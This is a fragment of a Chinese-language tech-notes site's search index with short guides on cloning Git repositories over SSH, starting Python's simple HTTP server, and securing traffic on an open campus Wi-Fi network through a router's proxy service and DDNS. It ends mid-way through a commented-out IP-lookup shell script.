\u6240\u4ee5\u6211\u4eec\u73b0\u5728\u9700\u8981\u505a\u7684\u5c31\u662f\u751f\u6210\u5bc6\u94a5\u5bf9\uff0c\u5c06\u516c\u94a5\u6dfb\u52a0\u5230\u670d\u52a1\u5668\u4e0a\uff0c\u5728\u672c\u5730\u4fdd\u5b58\u597d\u79c1\u94a5\u5e76\u5c06\u79c1\u94a5\u8def\u5f84\u6dfb\u52a0\u5230ssh\u914d\u7f6e\u6587\u4ef6\u4e2d\uff0c\u8fd9\u6837\u6bcf\u6b21\u90fd\u53ef\u4ee5\u201c\u81ea\u52a8\u201d\u8fdb\u884c\u8fde\u63a5\u4e86\u3002 \u5982\u679c\u4f60\u8fd8\u6ca1\u6709\u6dfb\u52a0SSH key \u5982\u679c\u4f60\u7684\u7ba1\u7406\u5458\u5df2\u7ecf\u4e3a\u7528\u6237\uff08\u4f60\uff09\u63d0\u4f9b\u4e86private key\uff0c\u8bf7\u59a5\u5584\u4fdd\u7ba1\uff0c\u7136\u540e\u8df3\u8fc7\u8fd9\u4e00\u7ae0\u8282\u3002 \u5982\u679c\u4f60\u662f\u7ba1\u7406\u5458\u5e76\u4e14\u4f60\u7684organization\u8fd8\u6ca1\u6709\u6dfb\u52a0public key\uff0c\u8bf7\u6839\u636e\u4e0a\u8ff0 \u6587\u6863\u4e2d\u7684\u7b2c\u4e00\u6b65 \uff0c\u4f7f\u7528 1 ssh - keygen \u6765\u751f\u6210\u5bc6\u94a5\u5bf9\u3002 Tip \u5982\u679c\u4f60\u6b63\u5728\u4f7f\u7528Windows\uff0c\u53ef\u4ee5\u4f7f\u7528WSL\u4e2d\u7684 ssh-keygen \uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528Putty\u63d0\u4f9b\u7684\u5de5\u5177\uff08\u5370\u8c61\u4e2d\u9700\u8981\u8f6c\u6362\u4e00\u4e0b\uff09\u3002 \u62e5\u6709.pub\u540e\u7f00\u7684\u6587\u4ef6\u662f\u4f60\u7684public key\uff0c\u8bf7\u6839\u636e \u6587\u6863\u4e2d\u7684\u7b2c\u4e8c\u6b65 \u6765\u5c06\u5b83\u4e0a\u4f20\u5230\u670d\u52a1\u5668\u4e0a\u3002 \u597d\u4e86\uff0c\u6211\u4eec\u53ef\u4ee5\u51c6\u5907\u6765\u8fde\u63a5\u4e86\u3002 git clone Failure \u6211\u731c\u8fd9\u4e2a\u65f6\u5019\u5df2\u7ecf\u6709\u540c\u5b66\u53bb\u76f4\u63a5\u53bbgit clone\u4e86\u7136\u540e\u53d1\u73b0\u8fd8\u662f\u8981\u8f93\u5165\u5bc6\u7801\uff08\u6216\u8005\u62a5\u4e00\u4e9b\u5947\u5947\u602a\u602a\u7684\u9519\uff09... \u73b0\u5728\u6211\u4eec\u6765\u628aprivate key\u7684\u8def\u5f84\u586b\u5165ssh\u7684\u4e00\u4e2a\u914d\u7f6e\u6587\u4ef6\u3002\u4f46\u5728\u8fd9\u4e4b\u524d\uff0c\u6211\u4eec\u9700\u8981\u6765\u4fdd\u8bc1private key\u7684\u6743\u9650\u662f\u4ec5\u6709\u81ea\u5df1\u53ef\u8bfb\u7684\uff0c\u5426\u5219\u4f60\u5e94\u8be5\u4f1a\u5f97\u5230\u4e00\u4e2a\u9519\u8bef\u63d0\u793aprivate key\u6743\u9650\u4e0d\u5b89\u5168\u3002\u4f60\u53ef\u4ee5\u901a\u8fc7 1 ls - l Tip \u5728Windows\u4e0b\uff0c\u4f60\u53ef\u4ee5\u5728Git Bash\u4e2d\u8bbe\u7f6e\u5b83\u4eec\u3002\u5f53\u7136\uff0c\u4f60\u4e5f\u53ef\u4ee5\u9009\u62e9\u4f7f\u7528WSL\u7684Git\uff0c\u53ea\u662f\u67d0\u4e9b\u5e94\u7528\u53ef\u80fd\u6682\u65f6\u53ea\u652f\u6301\u8c03\u7528Windows\u7248\u7684Git\u3002 \u6765\u67e5\u770b\u5f53\u524d\u76ee\u5f55\u4e0b\u6587\u4ef6\u7684\u6743\u9650\uff0c\u7136\u540e\u901a\u8fc7 1 chmod 600 filename \u6765\u628a\u67d0\u4e2a\u6587\u4ef6\uff08\u5e94\u8be5\u4e0d\u7528\u6211\u8bf4\u4e0a\u9762\u7684filename\u8981\u6539\u6210\u4f60\u60f3\u6539\u7684\u6587\u4ef6\u7684\u6587\u4ef6\u540d\u5427\uff09\u7684\u6743\u9650\u6539\u4e3a\u4ec5owner\u53ef\u8bfb\u53ef\u5199\u3002 \u7136\u540e\u6211\u4eec\u5c31\u53ef\u4ee5\u6765\u628a\u8def\u5f84\u586b\u5230\u914d\u7f6e\u6587\u4ef6\u91cc\u4e86\uff0c\u4f60\u53ef\u4ee5\u901a\u8fc7nano\u6765\u7f16\u8f91\uff1a 1 nano ~/ . ssh / config \u7136\u540e\u52a0\u5165\u5982\u4e0b\u5185\u5bb9\uff0c\u6bd4\u5982\u8fd9\u6837\uff1a 1 2 3 4 Host ssh . dev . azure . com Hostname ssh . dev . azure . com User git IdentityFile private_key_path \u8fd9\u4e2a\u53ef\u5c31\u8981\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u7075\u6d3b\u53d8\u901a\u4e86\uff0c\u53ef\u522b\u7167\u6284\u51fa\u4e86\u95ee\u9898\u3002\u5982\u679c\u4f60\u4f7f\u7528\u7684\u662fnano\uff0c\u4f60\u53ef\u4ee5 Ctrl+X \u9000\u51fa\uff0c\u7136\u540e y \u786e\u8ba4\u4fdd\u5b58\uff0c Enter \u5199\u5165\u3002 \u8fd9\u4e2a\u65f6\u5019\uff0c\u4f60\u5e94\u8be5\u53ef\u4ee5\u6b63\u5e38\u5730\u8fdb\u884cgit clone\uff08\u901a\u8fc7SSH\uff09\u4e86\u3002 \u6700\u540e\u7684\u5e9f\u8bdd \u5982\u679c\u4f60\u5bf9\u5bc6\u7801\u5b66\u611f\u5174\u8da3\u7684\u8bdd\uff0c\u6709\u5f88\u591a\u4e0d\u9519\u7684\u8d44\u6599\uff0c\u6bd4\u5982... \u56fe\u89e3\u5bc6\u7801\u6280\u672f \uff0c \u5bc6\u7801\u5b66\u7b80\u4ecb - CTF Wiki \u4e4b\u7c7b\u7684\uff0c\u60f3\u4e86\u89e3\u66f4\u591a\u8bf7\u53bb\u627e\u4f18\u79c0\u7684\u8d44\u6599\uff0c\u6700\u597d\u522b\u5728\u8fd9\u91cc\u770b\u6211\u778e\u626f...\uff08\u867d\u7136\u597d\u50cf\u548c\u672c\u6587\u6ca1\u5565\u5173\u8054\uff09","title":"git clone \u901a\u8fc7ssh"},{"location":"misc/git_clone_via_ssh/#ssh-key","text":"\u5982\u679c\u4f60\u7684\u7ba1\u7406\u5458\u5df2\u7ecf\u4e3a\u7528\u6237\uff08\u4f60\uff09\u63d0\u4f9b\u4e86private key\uff0c\u8bf7\u59a5\u5584\u4fdd\u7ba1\uff0c\u7136\u540e\u8df3\u8fc7\u8fd9\u4e00\u7ae0\u8282\u3002 \u5982\u679c\u4f60\u662f\u7ba1\u7406\u5458\u5e76\u4e14\u4f60\u7684organization\u8fd8\u6ca1\u6709\u6dfb\u52a0public key\uff0c\u8bf7\u6839\u636e\u4e0a\u8ff0 \u6587\u6863\u4e2d\u7684\u7b2c\u4e00\u6b65 \uff0c\u4f7f\u7528 1 ssh - keygen \u6765\u751f\u6210\u5bc6\u94a5\u5bf9\u3002 Tip \u5982\u679c\u4f60\u6b63\u5728\u4f7f\u7528Windows\uff0c\u53ef\u4ee5\u4f7f\u7528WSL\u4e2d\u7684 ssh-keygen \uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528Putty\u63d0\u4f9b\u7684\u5de5\u5177\uff08\u5370\u8c61\u4e2d\u9700\u8981\u8f6c\u6362\u4e00\u4e0b\uff09\u3002 \u62e5\u6709.pub\u540e\u7f00\u7684\u6587\u4ef6\u662f\u4f60\u7684public key\uff0c\u8bf7\u6839\u636e \u6587\u6863\u4e2d\u7684\u7b2c\u4e8c\u6b65 \u6765\u5c06\u5b83\u4e0a\u4f20\u5230\u670d\u52a1\u5668\u4e0a\u3002 \u597d\u4e86\uff0c\u6211\u4eec\u53ef\u4ee5\u51c6\u5907\u6765\u8fde\u63a5\u4e86\u3002","title":"\u5982\u679c\u4f60\u8fd8\u6ca1\u6709\u6dfb\u52a0SSH key"},{"location":"misc/git_clone_via_ssh/#git-clone","text":"Failure \u6211\u731c\u8fd9\u4e2a\u65f6\u5019\u5df2\u7ecf\u6709\u540c\u5b66\u53bb\u76f4\u63a5\u53bbgit clone\u4e86\u7136\u540e\u53d1\u73b0\u8fd8\u662f\u8981\u8f93\u5165\u5bc6\u7801\uff08\u6216\u8005\u62a5\u4e00\u4e9b\u5947\u5947\u602a\u602a\u7684\u9519\uff09... \u73b0\u5728\u6211\u4eec\u6765\u628aprivate key\u7684\u8def\u5f84\u586b\u5165ssh\u7684\u4e00\u4e2a\u914d\u7f6e\u6587\u4ef6\u3002\u4f46\u5728\u8fd9\u4e4b\u524d\uff0c\u6211\u4eec\u9700\u8981\u6765\u4fdd\u8bc1private key\u7684\u6743\u9650\u662f\u4ec5\u6709\u81ea\u5df1\u53ef\u8bfb\u7684\uff0c\u5426\u5219\u4f60\u5e94\u8be5\u4f1a\u5f97\u5230\u4e00\u4e2a\u9519\u8bef\u63d0\u793aprivate key\u6743\u9650\u4e0d\u5b89\u5168\u3002\u4f60\u53ef\u4ee5\u901a\u8fc7 1 ls - l Tip \u5728Windows\u4e0b\uff0c\u4f60\u53ef\u4ee5\u5728Git Bash\u4e2d\u8bbe\u7f6e\u5b83\u4eec\u3002\u5f53\u7136\uff0c\u4f60\u4e5f\u53ef\u4ee5\u9009\u62e9\u4f7f\u7528WSL\u7684Git\uff0c\u53ea\u662f\u67d0\u4e9b\u5e94\u7528\u53ef\u80fd\u6682\u65f6\u53ea\u652f\u6301\u8c03\u7528Windows\u7248\u7684Git\u3002 \u6765\u67e5\u770b\u5f53\u524d\u76ee\u5f55\u4e0b\u6587\u4ef6\u7684\u6743\u9650\uff0c\u7136\u540e\u901a\u8fc7 1 chmod 600 filename \u6765\u628a\u67d0\u4e2a\u6587\u4ef6\uff08\u5e94\u8be5\u4e0d\u7528\u6211\u8bf4\u4e0a\u9762\u7684filename\u8981\u6539\u6210\u4f60\u60f3\u6539\u7684\u6587\u4ef6\u7684\u6587\u4ef6\u540d\u5427\uff09\u7684\u6743\u9650\u6539\u4e3a\u4ec5owner\u53ef\u8bfb\u53ef\u5199\u3002 \u7136\u540e\u6211\u4eec\u5c31\u53ef\u4ee5\u6765\u628a\u8def\u5f84\u586b\u5230\u914d\u7f6e\u6587\u4ef6\u91cc\u4e86\uff0c\u4f60\u53ef\u4ee5\u901a\u8fc7nano\u6765\u7f16\u8f91\uff1a 1 nano ~/ . ssh / config \u7136\u540e\u52a0\u5165\u5982\u4e0b\u5185\u5bb9\uff0c\u6bd4\u5982\u8fd9\u6837\uff1a 1 2 3 4 Host ssh . dev . azure . com Hostname ssh . dev . azure . com User git IdentityFile private_key_path \u8fd9\u4e2a\u53ef\u5c31\u8981\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u7075\u6d3b\u53d8\u901a\u4e86\uff0c\u53ef\u522b\u7167\u6284\u51fa\u4e86\u95ee\u9898\u3002\u5982\u679c\u4f60\u4f7f\u7528\u7684\u662fnano\uff0c\u4f60\u53ef\u4ee5 Ctrl+X \u9000\u51fa\uff0c\u7136\u540e y \u786e\u8ba4\u4fdd\u5b58\uff0c Enter \u5199\u5165\u3002 \u8fd9\u4e2a\u65f6\u5019\uff0c\u4f60\u5e94\u8be5\u53ef\u4ee5\u6b63\u5e38\u5730\u8fdb\u884cgit clone\uff08\u901a\u8fc7SSH\uff09\u4e86\u3002","title":"git clone"},{"location":"misc/git_clone_via_ssh/#_1","text":"\u5982\u679c\u4f60\u5bf9\u5bc6\u7801\u5b66\u611f\u5174\u8da3\u7684\u8bdd\uff0c\u6709\u5f88\u591a\u4e0d\u9519\u7684\u8d44\u6599\uff0c\u6bd4\u5982... \u56fe\u89e3\u5bc6\u7801\u6280\u672f \uff0c \u5bc6\u7801\u5b66\u7b80\u4ecb - CTF Wiki \u4e4b\u7c7b\u7684\uff0c\u60f3\u4e86\u89e3\u66f4\u591a\u8bf7\u53bb\u627e\u4f18\u79c0\u7684\u8d44\u6599\uff0c\u6700\u597d\u522b\u5728\u8fd9\u91cc\u770b\u6211\u778e\u626f...\uff08\u867d\u7136\u597d\u50cf\u548c\u672c\u6587\u6ca1\u5565\u5173\u8054\uff09","title":"\u6700\u540e\u7684\u5e9f\u8bdd"},{"location":"misc/python_http_server/","text":"\u8fd9\u7bc7\u5e76\u4e0d\u662f\u5728\u8ba8\u8bbaPython HTTP servers\u7684\u5404\u79cd\u7528\u6cd5\uff0c\u800c\u662f\u8bb0\u5f55\u7ed9\u67d0\u4e9b\u61d2\u4eba\u4eec\u7528\u7684\u5982\u4f55\u542f\u52a8SimpleHTTPServer\u3002 \u5982\u679c\u4f60\u6b63\u5728\u4f7f\u7528Python2\uff0c\u90a3\u4e48\u4f60\u5e94\u8be5\uff1a 1 python - m SimpleHTTPServer \u5982\u679c\u4f60\u6b63\u5728\u4f7f\u7528Python3\uff0c\u90a3\u4e48\uff1a 1 python - m http . server \u5f53\u7136\uff0c\u522b\u5fd8\u4e86\u6211\u5728\u8ba8\u8bbaPhpStorm\u7684\u65f6\u5019\u63d0\u5230\u7684PHP Built-in Web Server\u3002","title":"Python SimpleHTTPServer"},{"location":"misc/secure_public_wireless_network_at_school_szu/","text":"\u8fd9\u56de\u6765\u8ba8\u8bba\u4e00\u4e0b\u67d0\u4e2a\u8def\u7531\u5668\u56fa\u4ef6\u4e2d\u9644\u5e26\u7684\u529f\u80fd\u3002 \u5450\uff0c\u5c31\u662f\u8fd9\u8d27\u3002\u522b\u8bef\u4f1a\uff0c\u6211\u4eec\u4e0d\u4f1a\u8ba8\u8bba\u4efb\u4f55\u79d1\u5b66\u4e0a\u7f51\u76f8\u5173\u7684\u5185\u5bb9\uff0c\u4ec5\u4ec5\u53ea\u662f\u5229\u7528\u8fd9\u73a9\u610f\u513f\u6765\u4fdd\u62a4\u81ea\u5df1\u5728\u6821\u5185\u5f00\u653e\u65e0\u7ebf\u7f51\u7edc\u4e2d\u7684\u5b89\u5168\u3002 \u4f17\u6240\u5468\u77e5\uff0c\u5728\u5f00\u653e\u7684\u65e0\u7ebf\u7f51\u7edc\u4e2d\u4f20\u8f93\u7684\u6570\u636e\u53ef\u80fd\u88ab\u4ed6\u4eba\u770b\u5230\u3002 \u53ef\u522b\u5fd8\u4e86\u6211\u4eec\u5b66\u6821\u7684\u9009\u8bfe\u7cfb\u7edf\u7b49\u8bf8\u591a\u670d\u52a1\u90fd\u6ca1\u6709\u542f\u7528\u6216\u662f\u6ca1\u6709\u5f3a\u5236\u4f7f\u7528HTTPS\uff0c\u8fd9\u5c31\u610f\u5473\u7740\u6211\u4eec\u7684\u5f88\u591a\u6570\u636e\uff08\u5305\u62ec\u67d0\u4e9b\u5bc6\u7801\uff09\u90fd\u662f\u5728\u7f51\u7edc\u4e0a\u88f8\u5954\u7684\uff0c\u5b66\u6821\u53c8\u8fd9\u4e48\u5f00\u653e\uff0c\u8c01\u77e5\u9053\u54ea\u5929\u4f1a\u4e0d\u4f1a\u6709\u4eba\u8fdb\u6765\u5f00\u4e2a\u76d1\u542c\u6a21\u5f0f\u6293\u4e00\u6ce2\u5bc6\u7801\u5462...\u4e0d\u6307\u671b\u7740\u7b49\u5b66\u6821\u628a\u65e0\u7ebf\u7f51\u7edc\u6539\u6210\u4f01\u4e1a\u8ba4\u8bc1\u4e86\uff0c\u8fd8\u662f\u5229\u7528\u4e00\u4e9b\u5de5\u5177\u5148\u6765\u4fdd\u62a4\u81ea\u5df1\u6bd4\u8f83\u597d\u3002 \u5173\u4e8e\u8fd9\u4e2a\u56fa\u4ef6\u7684\u5177\u4f53\u8be6\u60c5\u53ef\u4ee5\u770b \u8fd9\u91cc \uff0c\u5e94\u8be5\u4e0d\u9700\u8981\u6211\u518d\u626f\u4e86\u3002\u6211\u4e4b\u6240\u4ee5\u7528\u8fd9\u4e2a...\u4e3b\u8981\u662f\u56e0\u4e3a\u96c6\u6210\u4e86\u5f88\u591a\u529f\u80fd\uff0c\u4e0d\u9700\u8981\u81ea\u5df1\u518d\u8d39\u52b2\u53bb\u88c5\u4e86\uff0c\u5f53\u7136\uff0c\u4f60\u8981\u662f\u60f3\u6298\u817e\uff0c\u6761\u6761\u5927\u8def\u901a\u7f57\u9a6c\u662f\u5427\u3002 \u51c6\u5907\u597d\u8def\u7531\u5668\u4e0a\u7684\u914d\u7f6e \u9996\u5148\uff0c\u8ba9\u6211\u4eec\u5148\u542f\u52a8\u4e00\u4e0b\u8fd9\u4e2a\u670d\u52a1\u5668\u3002 \u52a0\u5bc6\u65b9\u5f0f\u9009\u62e9\u540e\u8981\u8bb0\u4f4f\uff0c\u4e4b\u540e\u8981\u8fde\u63a5\u7684\u65f6\u5019\u8981\u586b\u3002\u5bc6\u7801\u5c3d\u91cf\u591f\u957f\u591f\u590d\u6742\uff0c\u5e76\u4e14\u5c3d\u91cf\u4e0d\u8981\u4e0e\u5176\u5b83\u5bc6\u7801\u91cd\u590d\u3002\u8fd8\u6709UDP\u8f6c\u53d1\u3002 \u6253\u5f00\u5f00\u5173\uff0c\u5e94\u7528\u672c\u9875\u9762\u8bbe\u7f6e\u3002\u5e94\u8be5\u57fa\u672c\u7684\u8bbe\u7f6e\u662f\u5b8c\u6210\u4e86\u3002 Windows\u4e0b\u8fde\u63a5 \u5047\u8bbe\u4f60\u6b63\u5728\u4f7f\u7528Windows\u3002\u6709\u4e2a\u4f3c\u4e4e\u6709\u70b9\u5e74\u5934\u7684\u8f6f\u4ef6\uff1aSS-Tap\uff0c\u8fd9\u4f3c\u4e4e\u4e0d\u662f\u4e2a\u5f88\u597d\u7684\u9009\u62e9\uff1f\u4f46\u662f\u5e73\u5e38\u7528\u7528\u4f53\u9a8c\u8fd8\u662f\u53ef\u4ee5\u7684\u3002 Tip \u6700\u65b0\u7248\u672c\uff081.1.0.1\uff09\u53bb\u6389\u4e86\u5168\u5c40\u89c4\u5219\uff0c\u5f00\u59cb\u4e13\u5fc3\u5730\u505a\u4e00\u4e2a\u6e38\u620f\u52a0\u901f\u5668\u4e86\uff08\uff1f\uff09\uff0c\u81ea\u884c\u6dfb\u52a0\u7684\u5168\u5c40\u89c4\u5219\u4e5f\u4f1a\u88ab\u6539\u6389\u3002\u4e3a\u4e86\u8ba9\u6211\u4eec\u5168\u90e8\u7684\u6d41\u91cf\u90fd\u4e0d\u4f1a\u66b4\u9732\u5728\u5f00\u653e\u7684\u65e0\u7ebf\u516c\u5171\u7f51\u7edc\u4e0a\uff0c\u6240\u4ee5\u9700\u8981\u6e9c\u5230\u7a0b\u5e8f\u7684\u89c4\u5219\u76ee\u5f55\u4e0b\u628a\u89c4\u5219\u6539\u4e86\u3002\u5f53\u7136\uff0c\u4f60\u4e5f\u53ef\u4ee5\u9009\u62e9\u65e7\u7248\uff0c\u636e\u4f20\u7248\u672c\u53f7\u4e3a1.0.9.7\u7684\u7a0b\u5e8f\u4ecd\u7136\u6709\u5168\u5c40\u89c4\u5219\u3002 \u5047\u88c5\u4f60\u5df2\u7ecf\u628a\u5b83\u88c5\u597d\u4e86\u5e76\u4e14\u6ca1\u6709\u9047\u5230\u4ec0\u4e48\u95ee\u9898\u3002\u90a3\u4e48\u8ba9\u6211\u4eec\u6765\u914d\u7f6e\u4e00\u4e0b\uff1a \u7531\u4e8e\u6211\u4eec\u5728\u8def\u7531\u7aef\u542f\u52a8\u7684\u662fss\uff0c\u6240\u4ee5\uff0c\u6dfb\u52a0\u4e00\u4e2aS/R\uff1a \u73b0\u5728\u5b66\u6821IP\u5730\u5740\u7684\u79df\u7ea6\u7adf\u7136\u662f10\u5206\u949f\uff0c\u5e0c\u671b\u4f60\u5728\u51fa\u95e8\u524d\u5df2\u7ecf\u4e8b\u5148\u770b\u597d\u5e76\u8bb0\u4f4f\u4e86\u8def\u7531\u5668\u7684IP\u5730\u5740\uff08\u5f53\u7136\uff0c\u6211\u8fd9\u4e48\u61d2\uff0c\u80af\u5b9a\u662f\u4e0d\u4f1a\u8fd9\u6837\u505a\u7684\uff0c\u4e0b\u6587\u4f1a\u5206\u4eab\u6211\u7684\u89e3tou\u51b3lan\u65b9\u6cd5\uff09\uff0c\u628a\u5b83\u586b\u8fdb \u670d\u52a1\u5668IP \u4e00\u680f\uff0c \u7aef\u53e3 \u3001 \u5bc6\u7801 \u3001 \u52a0\u5bc6\u65b9\u5f0f \u548c\u8def\u7531\u5668\u4e0a\u4fdd\u6301\u4e00\u81f4\u5373\u53ef\u3002 \u56e0\u4e3a\u6211\u4eec\u9700\u8981\u6570\u636e\u5728\u5f00\u653e\u7684\u7f51\u7edc\u4e2d\u4fdd\u8bc1\u5b89\u5168\uff0c\u6240\u4ee5\u6211\u4eec\u81ea\u7136\u66f4\u5e0c\u671b\u8fd9\u662f\u5168\u5c40\u7684\u4ee3\u7406\u3002\u53ef\u60dc\u8fd9\u8f6f\u4ef6\u7684\u6700\u540e\u4e00\u4e2a\u7248\u672c\u6ca1\u6709\uff0c\u6211\u4eec\u6765\u521b\u4e00\u4e2a\uff1a \u4e2d\u82f1\u6587\u540d\u5b57\u968f\u4fbf\u8d77\uff0c\u8bb0\u4f4f\u5c31\u597d\u3002\u522b\u5fd8\u4e86\u7c7b\u578b\u5f97\u662f \u4ee3\u7406 \u3002\u89c4\u5219\u5148\u586b\u4e0a 0.0.0.0/0 \u3002\u7136\u540e\u4fdd\u5b58\u3002 \u5370\u8c61\u4e2d\uff0c\u8fd9\u4e2a\u81ea\u5df1\u5199\u7684\u6709\u70b9\u95ee\u9898\u7684\u5168\u5c40\u7684\u89c4\u5219\u4f1a\u88ab\u6539\u5199\u3002\u6211\u4eec\u5230\u5b83\u6240\u5728\u7684\u5730\u65b9\uff08\u5e94\u8be5\u5728\u4e2a\u4eba\u6587\u4ef6\u5939\u4e0b\u7684/AppData/Local/SSTap-beta/rules\u4e2d\uff09\u76f4\u63a5\u6539\u5b83\uff1a \u597d\u4e86\uff0c\u5fd9\u6d3b\u4e86\u534a\u5929\uff0c\u7ec8\u4e8e\u53ef\u4ee5\u5f00\u59cb\u8fde\u63a5\u4e86\u3002\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u5982\u679c\u4f60\u5df2\u7ecf\u8fde\u63a5\u4e0aSZU_WLAN\u5e76\u901a\u8fc7\u4e86\u65e0\u7ebf\u51c6\u5165\u8ba4\u8bc1\uff0c\u70b9\u51fb\u4e3b\u754c\u9762\u7684\u8fde\u63a5\u5c31\u53ef\u4ee5\u8fde\u4e0a\u4e86\u3002\u8fd9\u4e2a\u65f6\u5019\uff0c\u5982\u679c\u80fd\u8bbf\u95ee\u8def\u7531\u5668\u7684\u7ba1\u7406\u9875\u9762\uff0c\u8bf4\u660e\u914d\u7f6e\u5e94\u8be5\u662f\u6b63\u786e\u7684\u3002 \u5229\u7528DDNS\u6765\u8ba9\u4f60\u4e0d\u9700\u8981\u518d\u8bb0\u5fc6IP\u5730\u5740 \u5176\u5b9e\u6211\u4e00\u76f4\u5728\u60f3\u4e00\u4ef6\u4e8b\uff1a\u90a3\u4e9b\u5929\u5929\u5728\u7528\u5185\u7f51IP\u8fdc\u7a0b\u63a7\u5236\u7684\u540c\u5b66\u4eec\uff0c\u6bcf\u5929\u51fa\u95e8\u770bIP\u3001\u63d0\u5fc3\u540a\u80c6\u6015IP\u53d8\u52a8\u3001\u5b9e\u5728\u4e0d\u884c\u8fd8\u8981\u5f00\u4e2aTeamViewer\u6765\u770b\u770bIP\uff0c\u4e0d\u662f\u5f88\u7d2f\u5417... \u4f60\u53ef\u80fd\u6309\u7167\u4e0a\u6587\u914d\u7f6e\u597d\u4e86\u670d\u52a1\uff0c\u4f46\u662f\u6bcf\u5929\u8981\u8fde\u63a5\u7684\u65f6\u5019\u90fd\u8981\u6539\u4e00\u4e0b\u8f6f\u4ef6\u4e2d\u7684\u670d\u52a1\u5668IP\u3002\u66f4\u8981\u547d\u7684\u662f\uff0c\u51fa\u95e8\u8981\u68c0\u67e5\u7684\u4e0d\u4ec5\u662f\u624b\u673a\u6821\u5361\uff0c\u8fd8\u5f97\u770b\u770b\u4eca\u5929\u7684IP\u662f\u5565\uff0c\u8981\u662f\u4eca\u5929\u8fd0\u6c14\u4e0d\u597dIP\u53d8\u5316\u4e86\uff0c\u4e0d\u56de\u5bbf\u820d\u4e00\u8d9f\u597d\u50cf\u8fd8\u5c31\u90fd\u8fde\u4e0d\u4e0a\u4e86\u3002\u522b\u614c\uff0c\u8fd9\u4e2a\u56fa\u4ef6\u91cc\u6709\u8fd9\u4e2a\u4e1c\u897f\uff1a \u5982\u679c\u4f60\u6709\u4e00\u4e2a\u57df\u540d\uff0c\u5c31\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u7a0b\u5e8f\u6765\u5e2e\u4f60\u5728IP\u5730\u5740\u53d8\u52a8\u65f6\uff0c\u81ea\u52a8\u5730\u5c06\u57df\u540d\u7684\u67d0\u4e2a\u89e3\u6790\u8bb0\u5f55\u66f4\u65b0\u6210\u65b0\u7684IP\u5730\u5740\u3002\u8fd9\u5c31\u610f\u5473\u7740\uff0c\u5e73\u65f6\u53ea\u9700\u8981\u8bb0\u4f4f\u81ea\u5df1\u7684\u57df\u540d\uff0c\u5269\u4e0b\u7684\u5c31\u4ea4\u7ed9DDNS\u6765\u89e3\u51b3\u5c31\u597d\u4e86\u3002 \u8fd9\u4e2a\u56fa\u4ef6\u6709\u5b9e\u73b0\u4e86\u591a\u4e2a\u5382\u5546\u7684DDNS\u7684\u7a0b\u5e8f\u3002\u4f60\u53ef\u4ee5\u9009\u62e9\u4e00\u4e2a\u5bf9\u5e94\u7684\u6765\u7528\u3002\u6211\u6b63\u5728\u7528Aliddns\uff0c\u9996\u5148\u9700\u8981\u5230\u963f\u91cc\u7684\u63a7\u5236\u53f0\u4e0a \u65b0\u589e\u4e00\u6761\u89e3\u6790\u8bb0\u5f55 \uff08\u5148\u968f\u4fbf\u6307\u5411\u4e00\u4e2a\u5185\u7f51\u5730\u5740\uff09\uff0c\u7136\u540e\u8981\u6709 accesskeys \uff0c\u8fd9\u4e9b\u963f\u91cc\u4e91\u7684\u5b98\u65b9\u6587\u6863\u91cc\u90fd\u6709\uff0c\u5e94\u8be5\u4e0d\u7528\u6211\u8bf4\u4e86...\u5148\u628a\u8fd9\u4e9b\u4fe1\u606f\u586b\u8fdbAliddns\u4fdd\u5b58\u3002 \u5bf9\u4e86\uff0c\u5982\u679c\u4f60\u8fde\u57df\u540d\u90fd\u6ca1\u6709\uff0c\u5148\u53bb\u4e70\u4e00\u4e2a\u5427\u3002\u6700\u597d\u662f\u56fa\u4ef6\u91cc\u90a3\u4e9b\u811a\u672c\u652f\u6301\u7684\uff0c\u4e0d\u7136\u53ef\u80fd\u8981\u6298\u817e\u534a\u5929... \u7136\u540e\uff0c\u70b9\u5f00\u4e0b\u65b9\u83b7\u53d6IP\u7684\u811a\u672c\uff0c\u6211\u4eec\u9700\u8981\u4fee\u6539\u5b83\u3002\u539f\u672c\u7684\u811a\u672c\u5e94\u8be5\u662f\u83b7\u53d6\u4e86IPv4\u51fa\u53e3\u5730\u5740\uff0c\u4f46\u662f\u8fd9\u5e76\u4e0d\u662f\u6211\u4eec\u76ee\u524d\u8fd9\u4e2a\u60c5\u51b5\u4e0b\u60f3\u8981\u7684\u3002\u6211\u4eec\u5e0c\u671b\u5b83\u662f\u5185\u7f51\u7684\u5730\u5740\uff0c\u6240\u4ee5\uff0c\u628a\u5b83\u6539\u6210\u4ece\u672c\u5730\u83b7\u53d6\u5730\u5740\uff0c\u5e76\u8fc7\u6ee4\u4e00\u4e0b\uff0c\u5c31\u50cf\u8fd9\u6837: \u4ece\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # \u81ea\u884c\u6d4b\u8bd5\u54ea\u4e2a\u4ee3\u7801\u80fd\u83b7\u53d6\u6b63\u786e\u7684IP\uff0c\u5220\u9664\u524d\u9762\u7684#\u53ef\u751f\u6548 arIpAddress () { # IPv4\u5730\u5740\u83b7\u53d6 # \u83b7\u5f97\u5916\u7f51\u5730\u5740 #curltest=`which curl` #if [ -z \"$curltest\" ] || [ ! -s \"`which curl`\" ] ; then #wget --no-check-certificate --quiet --output-document=- \"https://www.ipip.net\" | grep \"IP\u5730\u5740\" | grep -E -o '([0-9]+\\.){3}[0-9]+' | head -n1 | cut -d' ' -f1 #wget --no-check-certificate --quiet --output-document=- \"http://members.3322.org/dyndns/getip\" | grep -E -o '([0-9]+\\.){3}[0-9]+' | head -n1 | cut -d' ' -f1 #wget --no-check-certificate --quiet --output-document=- \"ip.6655.com/ip.aspx\" | grep -E -o '([0-9]+\\.){3}[0-9]+' | head -n1 | cut -d' ' -f1 #wget --no-check-certificate --quiet --output-document=- \"ip.3322.net\" | grep -E -o '([0-9]+\\.){3}[0-9]+' | head -n1 | cut -d' ' -f1 #else #curl -L -k -s \"https://www.ipip.net\" | grep \"IP\u5730\u5740\" | grep -E -o '([0-9]+\\.){3}[0-9]+' | head -n1 | cut -d' ' -f1 #curl -k -s \"http://members.3322.org/dyndns/getip\" | grep -E -o '([0-9]+\\.){3}[0-9]+' | head -n1 | cut -d' ' -f1 #curl -k -s ip.6655.com/ip.aspx | grep -E -o '([0-9]+\\.){3}[0-9]+' | head -n1 | cut -d' ' -f1 #curl -k -s ip.3322.net | grep -E -o '([0-9]+\\.){3}[0-9]+' | head -n1 | cut -d' ' -f1 #fi } 